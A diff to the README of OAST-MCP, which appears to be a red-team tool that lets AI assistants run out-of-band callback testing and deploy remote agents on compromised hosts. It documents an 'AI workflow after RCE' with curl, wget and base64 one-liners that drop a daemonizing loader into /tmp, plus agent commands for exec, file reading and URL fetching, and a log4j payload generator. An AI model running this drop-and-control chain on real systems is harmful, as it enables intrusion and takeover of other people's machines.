@@ -1,21 +1,20 @@
+<!-- markdownlint-disable MD033 MD041 -->
 <div align="center">
 
 <img src="docs/OAST-mcp.png" alt="Logo" width="50%"/>
 
 <h1 align="center">OAST-MCP</h1>
+<!-- markdownlint-enable MD033 MD041 -->
 
-[![CI](https://github.com/dguerri/oast-mcp/actions/workflows/ci.yml/badge.svg)](https://github.com/dguerri/oast-mcp/actions/workflows/ci.yml)
-[![Coverage](https://codecov.io/gh/dguerri/oast-mcp/branch/main/graph/badge.svg)](https://codecov.io/gh/dguerri/oast-mcp)
-[![Go version](https://img.shields.io/badge/go-1.25-00ADD8?logo=go)](https://go.dev/dl/)
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
+[![CI](https://github.com/dguerri/oast-mcp/actions/workflows/ci.yml/badge.svg)](https://github.com/dguerri/oast-mcp/actions/workflows/ci.yml) [![Coverage](https://codecov.io/gh/dguerri/oast-mcp/branch/main/graph/badge.svg)](https://codecov.io/gh/dguerri/oast-mcp) [![Go version](https://img.shields.io/badge/go-1.25-00ADD8?logo=go)](https://go.dev/dl/) [![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
 
-<b>Out-of-Band Application Security Testing via the Model Context Protocol.</b>
+**Out-of-Band Application Security Testing via the Model Context Protocol.**
 
-OAST-MCP exposes six OAST tools and six agent-management tools to any MCP-compatible AI assistant. It lets an AI drive DNS/HTTP/HTTPS callback detection, deploy agents on compromised targets, and run remote tasks. 
+OAST-MCP exposes six OAST tools and six agent-management tools to any MCP-compatible AI assistant. It lets an AI drive DNS/HTTP/HTTPS callback detection, deploy agents on compromised targets, and run remote tasks.
 
 All from a single, audited MCP interface.
 
-<pre>
+```text
 ┌────────────────────────────────────────────────────────┐
 │          AI Assistant (Claude, GPT-4o, …)              │
 │            MCP client → SSE transport                  │
@@ -37,8 +36,10 @@ All from a single, audited MCP interface.
 │           │  (DNS :53 · HTTP :9090) │                  │
 │           └─────────────────────────┘                  │
 └────────────────────────────────────────────────────────┘
-</pre>
+```
+<!-- markdownlint-disable MD033 MD041 -->
 </div>
+<!-- markdownlint-enable MD033 MD041 -->
 
 ---
 
@@ -115,7 +116,7 @@ sudo oast-mcp token \
 
 Configure your AI assistant to connect to the MCP SSE endpoint:
 
-```
+```text
 URL:           https://mcp.oast.info/sse
 Authorization: Bearer <token from step 4>
 ```
@@ -125,11 +126,13 @@ Authorization: Bearer <token from step 4>
 `.agents/skills/oast-mcp/SKILL.md` follows the [agentskills.io](https://agentskills.io) standard and teaches your AI assistant the correct tool order, capability params, and common pitfalls. Without it, the assistant may poll `oast_list_events` instead of blocking on `oast_wait_for_event`, or misconfigure delivery modes.
 
 **Gemini CLI, Codex, and other [agentskills.io-compatible](https://agentskills.io) agents** — scan `.agents/skills/` in the project directory and `~/.agents/skills/` globally. If you're working inside this repository the skill is auto-discovered. For global access:
+
 ```bash
 cp -r .agents/skills/oast-mcp ~/.agents/skills/oast-mcp
 ```
 
 **Claude Code** — scans `.claude/skills/` (project) and `~/.claude/skills/` (user), not `.agents/skills/`:
+
 ```bash
 cp -r .agents/skills/oast-mcp ~/.claude/skills/oast-mcp
 ```
@@ -184,7 +187,7 @@ Delete `deploy/.env` and `deploy/operator.key` manually if you are retiring the 
 
 ### Create a session and get callback endpoints
 
-```
+```json
 Tool: oast_create_session
 Args: { "ttl_seconds": 3600, "tags": ["ssrf-test", "pr-123"] }
 
@@ -215,7 +218,7 @@ curl https://a1b2c3d4e5.oast.example.com/test
 
 ### Poll for interactions
 
-```
+```json
 Tool: oast_list_events
 Args: { "session_id": "abc123" }
 
@@ -236,7 +239,7 @@ Response:
 
 ### Close a session
 
-```
+```json
 Tool: oast_close_session
 Args: { "session_id": "abc123" }
 ```
@@ -245,7 +248,7 @@ Args: { "session_id": "abc123" }
 
 Instead of polling in a loop, the AI can block until an event arrives or the timeout expires:
 
-```
+```json
 Tool: oast_wait_for_event
 Args: { "session_id": "abc123", "timeout_seconds": 30 }
 
@@ -271,7 +274,7 @@ Returns `timed_out: true` (with an empty `events` array) if no event arrives wit
 
 Generate a ready-to-use injection payload for a session. The `type` field selects the payload template (e.g. `log4j`, `ssrf`, `generic`); `label` is an optional human-readable tag embedded in the subdomain.
 
-```
+```json
 Tool: oast_generate_payload
 Args: { "session_id": "abc123", "type": "log4j", "label": "ua-header" }
 
@@ -292,7 +295,7 @@ Agents are two-stage Go binaries. The AI deploys them automatically after achiev
 
 ### Architecture
 
-```
+```text
 Stage 1 — loader (Linux C/musl ~77KB, Windows Go ~1.8MB)
   Delivered to target via curl, wget, or inline base64.
   Daemonizes immediately (double-fork on Linux, detached process on Windows)
@@ -312,13 +315,15 @@ Stage 2 — agent (~3MB UPX)
 
 ### Deploy an agent via MCP (automated)
 
-```
+```json
 Tool: agent_dropper_generate
 Scope required: agent:admin
 Args: {
   "agent_id": "web-01",
   "os_arch":  "linux-amd64",
-  "ttl":      "24h"
+  "ttl":      "24h",
+  "delivery": "url",        // or "inline" for air-gapped targets
+  "insecure": false         // true = skip TLS cert verification (audited, stored in agent session)
 }
 
 Response:
@@ -329,30 +334,45 @@ Response:
   "download_url": "https://agent.example.com/dl/loader-linux-amd64",
   "curl_cmd":     "curl -fsSL '...' -o /tmp/.l && chmod +x /tmp/.l && /tmp/.l https://agent.example.com eyJ... web-01",
   "wget_cmd":     "wget -qO /tmp/.l '...' && chmod +x /tmp/.l && /tmp/.l https://agent.example.com eyJ... web-01",
-  "b64":          "<base64 of loader binary>",
   "b64_cmd":      "printf '<b64>' | base64 -d > /tmp/.l && chmod +x /tmp/.l && /tmp/.l ..."
 }
 ```
 
+Loader flags (set via `insecure` parameter or appended manually to the command):
+
+- `-k` — skip TLS certificate verification. Propagated to Stage 2: the agent's WebSocket connection and `fetch_url` capability both skip verification. Use only when the target has no CA bundle (e.g. minimal containers). **Recorded in the audit log and stored in the agent session.**
+- `-f` — stay in foreground (do not daemonize). Useful for debugging — errors are printed to stderr.
+
 **AI workflow after RCE:**
+
 1. Probe target: `uname -m` (Linux) or `$ENV:PROCESSOR_ARCHITECTURE` (Windows) to determine `os_arch`.
-2. Call `agent_dropper_generate` with `agent_id`, `os_arch`, and `ttl`.
-3. Run `curl_cmd`, `wget_cmd`, or `b64_cmd` on the target via the RCE primitive.
-4. Call `agent_list` to confirm the agent appears as `online`.
+2. Call `agent_dropper_generate` with `agent_id`, `os_arch`, `ttl`, and `delivery`. Pass `insecure: true` only if the target lacks a CA bundle.
+3. Try commands in order (`curl_cmd` → `wget_cmd` → `python3_cmd`, or `b64_cmd` for inline). The command returns immediately — the loader daemonizes and downloads Stage 2 in the background.
+4. Wait a few seconds, then poll `agent_list` until the agent appears as `online`.
 5. Use `agent_task_schedule` to run tasks.
 
 ### List registered agents
 
-```
+```json
 Tool: agent_list
 Scope required: agent:admin
 
-Response: [{ "agent_id": "web-01", "status": "online", "last_seen_at": "..." }]
+Response: [{
+  "agent_id":     "web-01",
+  "status":       "online",
+  "capabilities": ["exec", "read_file", "fetch_url", "system_info"],
+  "insecure":     false,        // true = agent is running with TLS verification disabled
+  "registered_at": "...",
+  "last_seen_at": "...",
+  "expires_at":   "..."
+}]
 ```
+
+The `insecure` field reflects how the agent was deployed. Use it to identify agents where TLS verification is disabled — this is also captured in the audit log at dropper generation time.
 
 ### Schedule a task
 
-```
+```json
 Tool: agent_task_schedule
 Args: {
   "agent_id":   "web-01",
@@ -365,21 +385,27 @@ Response: { "task_id": "task-uuid", "status": "pending" }
 
 Available capabilities:
 
-| Capability    | Params                                       | Result                               |
-| ------------- | -------------------------------------------- | ------------------------------------ |
-| `exec`        | `cmd` (string), `timeout` (int, default 30s) | `output` (string), `exit_code` (int) |
-| `read_file`   | `path` (string)                              | `content` (base64), `path`           |
-| `fetch_url`   | `url` (string), `timeout` (int, default 15s) | `status` (int), `body` (base64)      |
-| `system_info` | —                                            | `hostname`, `os`, `arch`, `user`     |
+| Capability    | Params                                       | Result                               | Notes                                          |
+| ------------- | -------------------------------------------- | ------------------------------------ | ---------------------------------------------- |
+| `exec`        | `cmd` (string), `timeout` (int, default 30s) | `output` (string), `exit_code` (int) |                                                |
+| `read_file`   | `path` (string)                              | `content` (base64), `path`           |                                                |
+| `fetch_url`   | `url` (string), `timeout` (int, default 15s) | `status` (int), `body` (base64)      | TLS verification follows the agent's `-k` flag |
+| `system_info` | —                                            | `hostname`, `os`, `arch`, `user`     |                                                |
 
 ### Check task status
 
-```
+```json
 Tool: agent_task_status
-Args: { "task_id": "task-uuid" }
+Args: {
+  "task_id":     "task-uuid",
+  "wait":        true,   // block server-side until done/error (default: true)
+  "timeout_secs": 30    // how long this call blocks, not the task deadline (default: 30, max: 120)
+}
 
 Response: { "status": "done", "result": { "output": "uid=0(root)", "exit_code": 0 } }
 ```
+
+By default the call blocks server-side until the task completes or the wait timeout elapses — no polling needed. If `timed_out: true` is returned, the task is still running; call `agent_task_status` again. Set `wait: false` to get the current status instantly (useful when checking multiple tasks in parallel).
 
 ---
 
